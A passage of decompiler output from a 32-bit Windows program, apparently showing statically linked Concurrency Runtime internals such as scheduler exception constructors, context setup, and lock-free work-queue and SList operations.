  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_key::`vftable';
  return this;
}
// 493BEC: using guessed type void *Concurrency::invalid_scheduler_policy_key::`vftable';

//----- (004529D2) --------------------------------------------------------
char *__thiscall sub_4529D2(char *this, int a2)
{
  sub_405BE0(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_value::`vftable';
  return this;
}
// 493BF8: using guessed type void *Concurrency::invalid_scheduler_policy_value::`vftable';

//----- (00452A0F) --------------------------------------------------------
_DWORD *__thiscall sub_452A0F(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  this[1] = 0;
  this[2] = 0;
  this[3] = a2;
  result = this;
  *this = &Concurrency::scheduler_resource_allocation_error::`vftable';
  return result;
}
// 493930: using guessed type void *Concurrency::scheduler_resource_allocation_error::`vftable';

//----- (00452A2C) --------------------------------------------------------
_DWORD *__thiscall sub_452A2C(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  this[1] = 0;
  this[2] = 0;
  this[3] = a2;
  result = this;
  *this = &Concurrency::scheduler_worker_creation_error::`vftable';
  return result;
}
// 493BBC: using guessed type void *Concurrency::scheduler_worker_creation_error::`vftable';

//----- (00452A5A) --------------------------------------------------------
_DWORD *__thiscall sub_452A5A(_DWORD *this)
{
  *this = 0;
  this[1] = 0;
  this[2] = unknown_libname_86(16);
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00452A73) --------------------------------------------------------
void *__thiscall sub_452A73(void *this, int a2, char a3)
{
  signed __int32 v4; // eax
  int v5; // edi
  int v6; // ebx
  int v7; // eax

  *((_DWORD *)this + 15) = -1;
  *((_DWORD *)this + 7) = a2;
  *(_DWORD *)this = &Concurrency::details::ContextBase::`vftable';
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 5) = 0;
  *((_DWORD *)this + 8) = 0;
  *((_DWORD *)this + 9) = 0;
  *((_DWORD *)this + 10) = 1;
  *((_DWORD *)this + 11) = 0;
  *((_DWORD *)this + 12) = 0;
  *((_DWORD *)this + 13) = 0;
  *((_DWORD *)this + 14) = 0;
  *((_DWORD *)this + 16) = 0;
  *((_DWORD *)this + 17) = 0;
  *((_BYTE *)this + 76) = a3;
  *((_DWORD *)this + 20) = 0;
  sub_449EED((_DWORD *)this + 21);
  *((_DWORD *)this + 25) = 0;
  *((_DWORD *)this + 26) = -1;
  *((_DWORD *)this + 27) = -1;
  *((_DWORD *)this + 28) = 0;
  *((_DWORD *)this + 29) = 0;
  *((_DWORD *)this + 30) = 0;
  *((_DWORD *)this + 31) = 0;
  sub_44EE0C((unsigned int *)this + 32, 7u);
  sub_452A5A((_DWORD *)this + 35);
  v4 = sub_450933(*((volatile signed __int32 **)this + 7));
  v5 = *((_DWORD *)this + 7);
  v6 = v4;
  *((_DWORD *)this + 2) = v4;
  v7 = (*(int (__thiscall **)(int))(*(_DWORD *)v5 + 4))(v5);
  sub_453A71(1, 4u, v7, v6);
  return this;
}
// 493C44: using guessed type void *Concurrency::details::ContextBase::`vftable';

//----- (00452B49) --------------------------------------------------------
void __thiscall sub_452B49(void **this)
{
  j_j__free(this[3]);
  j_j__free(this[4]);
}

//----- (00452B60) --------------------------------------------------------
void __thiscall sub_452B60(void **this)
{
  j_j__free(this[7]);
  j_j__free(this[8]);
}

//----- (00452B77) --------------------------------------------------------
void __thiscall sub_452B77(int this)
{
  int v2; // edi
  int v3; // esi

  if ( *(int *)(this + 4) > 0 )
  {
    v2 = **(_DWORD **)(this + 8);
    if ( v2 )
    {
      do
      {
        v3 = *(_DWORD *)(v2 + 4);
        j_j__free(*(void **)v2);
        sub_44775B((void *)v2);
        v2 = v3;
      }
      while ( v3 );
    }
  }
  j_j__free(*(void **)(this + 8));
}

//----- (00452BB3) --------------------------------------------------------
void __thiscall sub_452BB3(_DWORD *this)
{
  *this = &Concurrency::Context::`vftable';
}
// 493C28: using guessed type void *Concurrency::Context::`vftable';

//----- (00452BBA) --------------------------------------------------------
void __thiscall sub_452BBA(void *this)
{
  sub_452B77((int)this + 140);
  sub_4528B2((int *)this + 32);
  j_j__free(*((void **)this + 34));
  *(_DWORD *)this = &Concurrency::Context::`vftable';
}
// 493C28: using guessed type void *Concurrency::Context::`vftable';

//----- (00452BE8) --------------------------------------------------------
void __thiscall sub_452BE8(void **this)
{
  j_j__free(this[3]);
  j_j__free(this[2]);
}

//----- (00452BFF) --------------------------------------------------------
void __thiscall sub_452BFF(void *this)
{
  sub_44A336((volatile signed __int32 *)(*(_DWORD *)this + 4));
}

//----- (00452C38) --------------------------------------------------------
bool __thiscall sub_452C38(_DWORD *this, _DWORD *a2)
{
  return ((*this ^ *a2) & 0xFFFFFFF) == 0 && this[2] == a2[2];
}

//----- (00452C5B) --------------------------------------------------------
int __thiscall sub_452C5B(_DWORD *this, int a2)
{
  int v2; // ecx
  int v3; // eax
  _DWORD *v4; // ecx
  int v5; // eax

  v2 = this[2];
  v3 = a2 >> 4;
  if ( a2 >> 4 >= 4 )
  {
    v4 = *(_DWORD **)(v2 + 12);
    v5 = v3 - 3;
    do
    {
      v4 = (_DWORD *)v4[1];
      --v5;
    }
    while ( v5 );
  }
  else
  {
    v4 = *(_DWORD **)(v2 + 4 * v3);
  }
  return *v4 + 8 * (a2 & 0xF);
}

//----- (00452C8D) --------------------------------------------------------
_DWORD *__thiscall sub_452C8D(_DWORD *Block, char a2)
{
  *Block = &Concurrency::Context::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 493C28: using guessed type void *Concurrency::Context::`vftable';

//----- (00452CB0) --------------------------------------------------------
void *__thiscall sub_452CB0(void *Block, char a2)
{
  sub_452BBA(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00452CD5) --------------------------------------------------------
void **__thiscall sub_452CD5(void **Block, char a2)
{
  sub_452B60(Block + 19);
  sub_452B49(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00452D01) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_452D01(_DWORD *this, signed __int32 a2)
{
  _DWORD *v2; // esi
  volatile signed __int32 *v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // eax
  signed __int32 v6; // edx
  signed __int32 v7; // eax
  char v8; // al
  volatile __int32 *v9; // edi
  void *v10; // eax
  int *v11; // ecx
  int v12; // eax
  int v13; // edx
  size_t v15; // [esp-8h] [ebp-38h]
  char v16[8]; // [esp+Ch] [ebp-24h] BYREF
  int v17; // [esp+14h] [ebp-1Ch]
  int (*v18)(); // [esp+18h] [ebp-18h]
  int v19; // [esp+1Ch] [ebp-14h]
  volatile signed __int32 *v20; // [esp+20h] [ebp-10h]
  _DWORD *v21; // [esp+24h] [ebp-Ch]
  volatile signed __int32 *v22; // [esp+28h] [ebp-8h]
  char v23; // [esp+2Fh] [ebp-1h]

  v2 = this;
  v23 = 0;
  v21 = this;
  v3 = 0;
  v4 = this[12];
  do
  {
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v5 = *(volatile signed __int32 **)v4;
    v6 = 0;
    v22 = *(volatile signed __int32 **)v4;
    if ( (int)v2[10] <= 0 )
    {
LABEL_8:
      v8 = v23;
      if ( v23 )
        goto LABEL_25;
LABEL_9:
      _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -2, -1);
      v22 = (volatile signed __int32 *)((char *)v3 + v2[10]);
      v9 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v9, 1, 0) )
      {
        v10 = (void *)unknown_libname_86((unsigned __int64)(unsigned int)v2[10] >> 30 != 0 ? -1 : 4 * v2[10]);
        v15 = 4 * v2[10];
        v19 = (int)v10;
        memset(v10, 0, v15);
        v11 = (int *)operator new(0xCu);
        v20 = v11;
        if ( v11 )
        {
          v12 = v19;
          v11[1] = 0;
          v11[2] = -1;
          *v11 = v12;
        }
        else
        {
          v11 = 0;
        }
        v13 = v2[15];
        if ( v13 < v2[14] )
        {
          *(_DWORD *)(v2[13] + 4 * v13) = v11;
          ++v2[15];
        }
        _InterlockedExchange(v9, (__int32)v11);
      }
      if ( *v9 == 1 )
      {
        v17 = 0;
        v18 = sub_44AE9C;
        do
          sub_449592((int)v16);
        while ( *v9 == 1 );
      }
      v3 = v22;
      goto LABEL_24;
    }
    while ( *v5 )
    {
LABEL_7:
      ++v6;
      v22 = ++v5;
      if ( v6 >= v2[10] )
        goto LABEL_8;
    }
    v20 = (volatile signed __int32 *)((char *)v3 + v6);
    *(_DWORD *)(a2 + 68) = (char *)v3 + v6;
    v19 = v2[16];
    v7 = _InterlockedCompareExchange(v22, a2, 0);
    v2 = v21;
    if ( v7 )
    {
      v5 = v22;
      goto LABEL_7;
    }
    v3 = v20;
    v23 = 1;
    if ( (int)v20 >= v19 )
      _InterlockedIncrement(v21 + 16);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v6);
LABEL_24:
    v8 = v23;
LABEL_25:
    v4 = *(_DWORD *)(v4 + 4);
  }
  while ( !v8 );
  return v3;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 452D01: using guessed type char var_24[8];

//----- (00452E5D) --------------------------------------------------------
void __thiscall sub_452E5D(volatile signed __int32 *this, int a2, char a3)
{
  sub_452EB6((int)(this + 20), (_DWORD *)(a2 + 92));
  *(_BYTE *)(a2 + 77) = 1;
  if ( a3 )
    _InterlockedDecrement(this + 25);
}

//----- (00452E87) --------------------------------------------------------
int __thiscall sub_452E87(int *this, _DWORD *a2)
{
  int result; // eax

  result = *this;
  if ( *this )
  {
    a2[1] = *(_DWORD *)(result + 4);
    *a2 = *this;
    **(_DWORD **)(*this + 4) = a2;
    result = *this;
    *(_DWORD *)(*this + 4) = a2;
  }
  else
  {
    a2[1] = a2;
    *a2 = a2;
  }
  *this = (int)a2;
  return result;
}

//----- (00452EB6) --------------------------------------------------------
void __thiscall sub_452EB6(int this, _DWORD *a2)
{
  sub_44A220((volatile signed __int32 *)(this + 4));
  sub_452E87((int *)this, a2);
  sub_44A33A((volatile signed __int32 *)(this + 4));
}

//----- (00452EEA) --------------------------------------------------------
void __thiscall sub_452EEA(int this, signed __int32 a2)
{
  signed __int32 i; // edx
  signed __int32 v4; // eax
  int v5; // eax
  volatile signed __int32 *v6; // esi
  signed __int32 j; // edx
  signed __int32 v8; // eax

  _InterlockedIncrement((volatile signed __int32 *)(this + 112));
  for ( i = *(_DWORD *)(this + 104); i == -1 || a2 <= i; i = v4 )
  {
    v4 = _InterlockedCompareExchange((volatile signed __int32 *)(this + 104), a2, i);
    if ( v4 == i )
    {
      if ( *(_DWORD *)(this + 116) )
        v5 = -1;
      else
        v5 = a2;
      sub_4533BD((_DWORD *)this, v5);
      break;
    }
  }
  v6 = (volatile signed __int32 *)(this + 108);
  for ( j = *v6; j == -1 || a2 >= j; j = v8 )
  {
    v8 = _InterlockedCompareExchange(v6, a2, j);
    if ( v8 == j )
      break;
  }
}

//----- (00452F51) --------------------------------------------------------
signed __int32 __thiscall sub_452F51(volatile signed __int32 *this, signed __int32 a2)
{
  signed __int32 v3; // ebx

  _InterlockedCompareExchange(this + 26, -1, a2);
  sub_453610((int)this);
  v3 = 1 - _InterlockedExchangeAdd(this + 28, 0xFFFFFFFF);
  LOBYTE(v3) = -(v3 != 0);
  return v3 + 1;
}

//----- (00452F81) --------------------------------------------------------
void __thiscall sub_452F81(int this, int a2)
{
  int v2; // edi
  int v3; // esi
  int v4; // edx
  int v5; // eax
  int v6; // ecx
  volatile signed __int32 *v7; // [esp+14h] [ebp-14h]

  v2 = this + 80;
  v7 = (volatile signed __int32 *)(this + 84);
  sub_44A1F0((volatile signed __int32 *)(this + 84));
  if ( *(_DWORD *)v2 )
  {
    v3 = *(_DWORD *)(*(_DWORD *)v2 + 4);
    if ( v3 )
    {
      while ( 1 )
      {
        if ( *(_DWORD *)(v3 + 24) )
          goto LABEL_13;
        v4 = *(_DWORD *)(v3 - 44);
        if ( v4 == a2 )
          goto LABEL_12;
        if ( a2 )
          break;
        v5 = (16 * *(_DWORD *)(v4 + 4)) >> 4;
        if ( v5 != -1 )
          goto LABEL_10;
LABEL_13:
        if ( v3 != *(_DWORD *)v2 )
        {
          v3 = *(_DWORD *)(v3 + 4);
          if ( v3 )
            continue;
        }
        goto LABEL_15;
      }
      v6 = (16 * *(_DWORD *)(a2 + 4)) >> 4;
      if ( v6 == -1 )
        goto LABEL_13;
      v5 = (16 * *(_DWORD *)(v4 + 4)) >> 4;
      if ( v5 <= v6 )
        goto LABEL_13;
LABEL_10:
      if ( *(_DWORD *)(this + 60) != -1 && !sub_453456((_DWORD *)this, v4, v5) )
        goto LABEL_13;
LABEL_12:
      _InterlockedExchange((volatile __int32 *)(v3 + 24), 1);
      sub_452EEA(v3 - 92, -999);
      sub_452F81(0);
      goto LABEL_13;
    }
  }
LABEL_15:
  sub_44A336(v7);
}

//----- (00453076) --------------------------------------------------------
char __cdecl sub_453076(int a1)
{
  char result; // al

  result = sub_450C9C(*(_DWORD **)(a1 + 36));
  if ( !result )
  {
    sub_4531D6(*(_DWORD **)(a1 + 16));
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (00453082) --------------------------------------------------------
char __thiscall sub_453082(int *this, _DWORD *a2)
{
  int v2; // edi

  v2 = *(_DWORD *)(*(_DWORD *)(*this + 12) + 4 * this[1]);
  if ( v2 == 1 || _InterlockedExchange((volatile __int32 *)(*(_DWORD *)(*this + 12) + 4 * this[1]), 1) != v2 )
  {
    sub_4531F8(*this);
    return 0;
  }
  else
  {
    if ( a2 )
      *a2 = v2;
    return 1;
  }
}

//----- (004530C9) --------------------------------------------------------
int __thiscall sub_4530C9(int this)
{
  int v2; // ebx
  int v3; // eax

  sub_453698((int *)this);
  v2 = *(_DWORD *)(this + 8);
  v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  return sub_453A71(2, 4u, v3, v2);
}

//----- (00453104) --------------------------------------------------------
void __thiscall sub_453104(int *this)
{
  int *v1; // edi
  int v2; // esi
  int v3; // [esp+8h] [ebp-4h] BYREF

  v3 = 0;
  v1 = this + 32;
  while ( 1 )
  {
    v2 = sub_453555(v1, &v3);
    if ( !v2 )
      break;
    do
    {
      sub_454521(*(volatile signed __int32 **)(v2 + 8));
      v2 = *(_DWORD *)v2;
    }
    while ( v2 );
    ++v3;
  }
  sub_4528B2(v1);
}

//----- (00453143) --------------------------------------------------------
BOOL sub_453143()
{
  return sub_44AAD1(dword_500038, 0);
}

//----- (00453153) --------------------------------------------------------
int __thiscall sub_453153(int this)
{
  struct _SINGLE_LIST_ENTRY *v2; // eax
  PSLIST_ENTRY v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  int result; // eax

  v2 = sub_45A6AE(*(union _SLIST_HEADER **)(this + 24));
  *(_DWORD *)(this + 32) = v2;
  if ( !v2 )
  {
    v3 = InterlockedPopEntrySList((PSLIST_HEADER)(*(_DWORD *)(this + 24) + 88));
    v4 = 0;
    if ( v3 )
    {
      *(_DWORD *)(this + 32) = v3 - 6;
      if ( v3 != (PSLIST_ENTRY)24 )
      {
        sub_45BAE4((volatile __int32 *)&v3[-6]);
        v4 = *(_DWORD **)(this + 32);
LABEL_9:
        sub_452D01((_DWORD *)(*(_DWORD *)(this + 24) + 88), (signed __int32)v4);
        goto LABEL_10;
      }
    }
    else
    {
      *(_DWORD *)(this + 32) = 0;
    }
    v5 = operator new(0x74u);
    if ( v5 )
      v4 = sub_45BA76(v5);
    *(_DWORD *)(this + 32) = v4;
    goto LABEL_9;
  }
LABEL_10:
  result = *(_DWORD *)(this + 32);
  *(_DWORD *)(result + 72) = this;
  return result;
}

//----- (004531D6) --------------------------------------------------------
void **__stdcall sub_4531D6(_DWORD *a1)
{
  void **v2; // ecx
  void **result; // eax

  while ( a1 )
  {
    v2 = (void **)(a1 - 6);
    a1 = (_DWORD *)*a1;
    if ( v2 )
      result = sub_452CD5(v2, 1);
  }
  return result;
}

//----- (004531F8) --------------------------------------------------------
int __thiscall sub_4531F8(int this)
{
  int result; // eax

  result = _InterlockedExchangeAdd((volatile signed __int32 *)(this + 20), 0xFFFFFFFF);
  if ( !result )
    return sub_451340(
             (int (__cdecl **)(int))(this + 28),
             (int (__cdecl *)(int))sub_4538B5,
             (int (__cdecl *)(int))this,
             *(_DWORD *)this);
  return result;
}

//----- (00453213) --------------------------------------------------------
char __thiscall sub_453213(int *this)
{
  char result; // al
  int v3; // esi
  int v4; // esi
  bool v5; // zf
  _DWORD *v6; // esi
  _DWORD v7[5]; // [esp+10h] [ebp-3Ch] BYREF
  char *v8; // [esp+24h] [ebp-28h]
  int v9; // [esp+28h] [ebp-24h]
  int v10; // [esp+2Ch] [ebp-20h]
  bool v11; // [esp+32h] [ebp-1Ah]
  char v12; // [esp+33h] [ebp-19h]
  CPPEH_RECORD ms_exc; // [esp+34h] [ebp-18h]

  v7[4] = this;
  if ( this[25] )
  {
    v7[2] = 0;
    v7[3] = sub_44AE9C;
    do
      sub_44961B(v7);
    while ( this[25] );
  }
  if ( this[33] > 0 )
    sub_453104(this);
  if ( !this[20] )
    return sub_44A2E9(this + 21);
  result = 0;
  v11 = 0;
  while ( !result )
  {
    v12 = 1;
    sub_44A220(this + 21);
    ms_exc.registration.TryLevel = 0;
    v12 = 1;
    v3 = this[20];
    if ( v3 )
      v4 = *(_DWORD *)(v3 + 4);
    else
      v4 = 0;
    while ( 1 )
    {
      v5 = v4 == 0;
      if ( !v4 )
        break;
      if ( v4 == this[20] )
        v10 = 0;
      else
        v10 = *(_DWORD *)(v4 + 4);
      v9 = v4 - 92;
      v8 = sub_4543F5(*(char **)(v4 - 92 + 48));
      if ( !sub_44A394((volatile signed __int32 *)v8 + 1) )
      {
        sub_44A33A(this + 21);
        v12 = 0;
        sub_44AA64(1u);
        v5 = v4 == 0;
        break;
      }
      ms_exc.registration.TryLevel = 1;
      v6 = (_DWORD *)(v9 + 92);
      sub_45373D(this + 20, (_DWORD **)(v9 + 92));
      *(_BYTE *)(v9 + 77) = 0;
      sub_452E87((int *)v8, v6);
      ms_exc.registration.TryLevel = 0;
      v4 = v10;
      sub_44A33A((volatile signed __int32 *)v8 + 1);
    }
    v11 = v5;
    ms_exc.registration.TryLevel = -2;
    if ( v12 )
      sub_44A33A(this + 21);
    result = v11;
  }
  return result;
}

//----- (00453355) --------------------------------------------------------
int __thiscall sub_453355(_DWORD *this)
{
  int result; // eax

  result = this[3] + 1;
  this[3] = result;
  return result;
}

//----- (0045335D) --------------------------------------------------------
int __thiscall sub_45335D(_DWORD *this)
{
  int v1; // eax
  int result; // eax

  v1 = this[4];
  ++this[3];
  result = v1 + 1;
  this[4] = result;
  return result;
}

//----- (00453368) --------------------------------------------------------
int __thiscall sub_453368(_DWORD *this)
{
  int result; // eax

  result = this[3] - 1;
  this[3] = result;
  return result;
}

//----- (00453370) --------------------------------------------------------
int __thiscall sub_453370(_DWORD *this)
{
  int v1; // eax
  int result; // eax

  v1 = this[4];
  --this[3];
  result = v1 - 1;
  this[4] = result;
  return result;
}

//----- (0045337B) --------------------------------------------------------
char __thiscall sub_45337B(unsigned int *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // eax
  _DWORD *v5; // eax

  v4 = sub_450CAF((int)a2, *this);
  v5 = sub_4536EF(this, a2, v4);
  if ( !v5 )
    return 0;
  if ( a3 )
    *a3 = v5[2];
  sub_44775B(v5);
  return 1;
}

//----- (004533BD) --------------------------------------------------------
_DWORD *__thiscall sub_4533BD(_DWORD *this, int a2)
{
  int v3; // esi
  _DWORD *result; // eax
  int v5; // edi
  int v6; // ecx

  v3 = 0;
  result = this + 35;
  v5 = this[35];
  if ( v5 > 0 )
  {
    do
    {
      v6 = sub_452C5B(result, v3);
      if ( *(_DWORD *)(v6 + 4) >= a2 && (this[15] == -1 || this[15] <= a2) )
        _InterlockedIncrement((volatile signed __int32 *)v6);
      ++v3;
      result = this + 35;
    }
    while ( v3 < v5 );
  }
  return result;
}

//----- (00453405) --------------------------------------------------------
int __thiscall sub_453405(_DWORD *this)
{
  if ( this[4] )
    return 2;
  else
    return this[3] != 0;
}

//----- (00453419) --------------------------------------------------------
int __thiscall sub_453419(_DWORD *this)
{
  return this[31];
}

//----- (0045341D) --------------------------------------------------------
int __thiscall sub_45341D(_DWORD *this)
{
  int v1; // eax

  v1 = this[6];
  if ( v1 )
    return *(_DWORD *)(v1 + 256);
  else
    return 0;
}

//----- (0045342E) --------------------------------------------------------
int __thiscall sub_45342E(_DWORD *this)
{
  int v1; // edi

  v1 = this[6];
  if ( v1 )
    return (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v1 + 256) + 4))(*(_DWORD *)(v1 + 256));
  else
    return -1;
}

//----- (00453456) --------------------------------------------------------
bool __thiscall sub_453456(_DWORD *this, int a2, int a3)
{
  int v4; // eax
  int v5; // esi
  int v6; // eax
  bool v8; // zf

  if ( (int)this[28] <= 0 || this[26] > a3 )
    return 0;
  if ( this[15] != -1 && this[26] < this[15] )
  {
    v4 = this[13];
    v5 = a2;
    if ( a2 == v4 && a3 == (16 * *(_DWORD *)(v4 + 4)) >> 4 )
    {
      v6 = this[14];
LABEL_8:
      if ( v6 != 2 )
        return *(_DWORD *)(v6 + 8) != 0;
    }
    else
    {
      do
      {
        if ( v5 == this[12] )
          break;
        if ( (16 * *(_DWORD *)(v5 + 4)) >> 4 == a3 )
          break;
        v5 = sub_453B10((_DWORD *)v5);
      }
      while ( v5 );
      while ( v5 && v5 != this[12] )
      {
        if ( sub_45B8F2((_DWORD *)v5, 0) )
        {
          if ( v5 == this[12] )
            return 0;
          v6 = sub_45B8F2((_DWORD *)v5, 0);
          goto LABEL_8;
        }
        if ( ((*(int *)(v5 + 4) >> 28) & 1) != 0 )
          v8 = (*(_BYTE *)(v5 + 24) & 3) == 0;
        else
          v8 = !sub_45447E((_DWORD *)v5);
        if ( !v8 )
          return 1;
        v5 = sub_453B10((_DWORD *)v5);
      }
    }
    return 0;
  }
  return 1;
}
// 453519: conditional instruction was optimized away because esi.4!=0

//----- (00453532) --------------------------------------------------------
int __thiscall sub_453532(int this, int a2)
{
  sub_44AE12((volatile __int32 *)(this + 112));
  *(_DWORD *)(this + 72) = a2;
  return sub_44AE53((_DWORD *)(this + 112));
}

//----- (00453555) --------------------------------------------------------
int __thiscall sub_453555(int *this, int *a2)
{
  int v2; // edx
  _DWORD *i; // eax

  v2 = *a2;
  if ( *a2 >= *this )
    return 0;
  for ( i = (_DWORD *)(this[2] + 4 * v2); !*i; ++i )
  {
    if ( ++v2 >= *this )
      return 0;
  }
  *a2 = v2;
  return *(_DWORD *)(this[2] + 4 * v2);
}

//----- (00453586) --------------------------------------------------------
int __thiscall sub_453586(__int32 *this)
{
  volatile __int32 *v1; // edi
  __int32 v2; // edx
  int v3; // esi
  int v4; // ebx

  v1 = this + 1;
  do
  {
    v2 = *v1 - 1;
    _InterlockedExchange(v1, v2);
    if ( *this > v2 )
    {
      *v1 = v2 + 1;
      return sub_453967(this);
    }
    v3 = v2 & this[2];
    v4 = *(_DWORD *)(this[7] + 4 * v3);
  }
  while ( !v4 );
  if ( (v4 & 1) == 0 )
    return v4;
  v4 &= ~1u;
  if ( sub_453082((int *)(this[8] + 8 * v3), 0) )
    return v4;
  else
    return 1;
}

//----- (004535D7) --------------------------------------------------------
void *__thiscall sub_4535D7(_DWORD *this)
{
  void *v2; // esi

  v2 = (void *)this[9];
  sub_44AAD1(dword_500038, v2);
  this[9] = 0;
  return v2;
}

//----- (004535F5) --------------------------------------------------------
BOOL __thiscall sub_4535F5(_DWORD *lpTlsValue, int a2)
{
  lpTlsValue[9] = a2;
  return sub_44AAD1(dword_500038, lpTlsValue);
}

//----- (00453610) --------------------------------------------------------
char __thiscall sub_453610(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // esi
  bool v5; // zf
  signed __int32 i; // edx
  volatile signed __int32 *v8; // [esp+Ch] [ebp-4h]

  v8 = (volatile signed __int32 *)(this + 108);
  LOBYTE(v2) = _InterlockedExchange((volatile __int32 *)(this + 108), -1);
  v3 = *(_DWORD *)(this + 52);
  v4 = *(_DWORD *)(this + 116) != 0 ? -999 : -1;
  while ( v3 && v3 != *(_DWORD *)(this + 48) )
  {
    v2 = *(int *)(v3 + 4) >> 28;
    if ( (v2 & 1) != 0 )
    {
      v5 = (*(_BYTE *)(v3 + 24) & 3) == 0;
    }
    else
    {
      LOBYTE(v2) = sub_45447E((_DWORD *)v3);
      v5 = (_BYTE)v2 == 0;
    }
    if ( !v5 )
    {
      v4 = (16 * *(_DWORD *)(v3 + 4)) >> 4;
      break;
    }
    v2 = sub_453B10((_DWORD *)v3);
    v3 = v2;
  }
  for ( i = -1; i == -1 || v4 >= i; i = v2 )
  {
    v2 = _InterlockedCompareExchange(v8, v4, i);
    if ( v2 == i )
      break;
  }
  return v2;
}

//----- (00453693) --------------------------------------------------------
void __thiscall sub_453693(volatile signed __int32 *this)
{
  _InterlockedIncrement(this + 25);
}

//----- (00453698) --------------------------------------------------------
char __thiscall sub_453698(int *this)
{
  int v2; // esi

  v2 = this[8];
  if ( v2 )
  {
    this[8] = 0;
    if ( *(_DWORD *)(v2 + 80) <= *(_DWORD *)(v2 + 76) )
    {
      if ( *(_DWORD *)(v2 + 112) )
        sub_453532(v2, 0);
      else
        *(_DWORD *)(v2 + 72) = 0;
      sub_45376B((PSLIST_HEADER)(this[6] + 88), (struct _SINGLE_LIST_ENTRY *)v2, *(_DWORD *)(v2 + 68), 1);
    }
    else
    {
      sub_453532(v2, 0);
      sub_45A5E0((_DWORD *)this[6], v2);
    }
  }
  return sub_453213(this);
}

//----- (004536EF) --------------------------------------------------------
_DWORD *__thiscall sub_4536EF(_DWORD *this, _DWORD *a2, int a3)
{
  int v3; // edi
  _DWORD *v4; // esi
  _DWORD *v5; // edx
  int v6; // eax

  v3 = this[2];
  v4 = 0;
  v5 = *(_DWORD **)(v3 + 4 * a3);
  if ( !v5 )
    return 0;
  while ( 1 )
  {
    v6 = *v5;
    if ( v5[1] == *a2 )
      break;
    v4 = v5;
    v5 = (_DWORD *)*v5;
    if ( !v6 )
      return 0;
  }
  if ( v4 )
    *v4 = v6;
  else
    *(_DWORD *)(v3 + 4 * a3) = v6;
  --this[1];
  return v5;
}

//----- (0045373D) --------------------------------------------------------
_DWORD *__thiscall sub_45373D(_DWORD *this, _DWORD **a2)
{
  _DWORD *result; // eax

  *a2[1] = *a2;
  (*a2)[1] = a2[1];
  result = (_DWORD *)*this;
  if ( a2 == (_DWORD **)*this )
  {
    if ( result == (_DWORD *)result[1] )
      result = 0;
    else
      result = (_DWORD *)*result;
    *this = result;
  }
  return result;
}

//----- (0045376B) --------------------------------------------------------
char __thiscall sub_45376B(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4)
{
  int v5; // edx
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // edi
  int v11; // edx
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( (struct _SINGLE_LIST_ENTRY *)_InterlockedCompareExchange(
                                      (volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6),
                                      0,
                                      (signed __int32)a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = a2 + 6;
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && !sub_450C9C(*(_DWORD **)&ListHead[4].Depth)
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_451340(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_453076,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (0045385C) --------------------------------------------------------
void __thiscall sub_45385C(int this, _DWORD **a2)
{
  sub_44A220((volatile signed __int32 *)(this + 4));
  sub_45373D((_DWORD *)this, a2);
  sub_44A33A((volatile signed __int32 *)(this + 4));
}

//----- (00453890) --------------------------------------------------------
void __thiscall sub_453890(void *this, int a2)
{
  sub_45385C((int)this + 80, (_DWORD **)(a2 + 92));
}

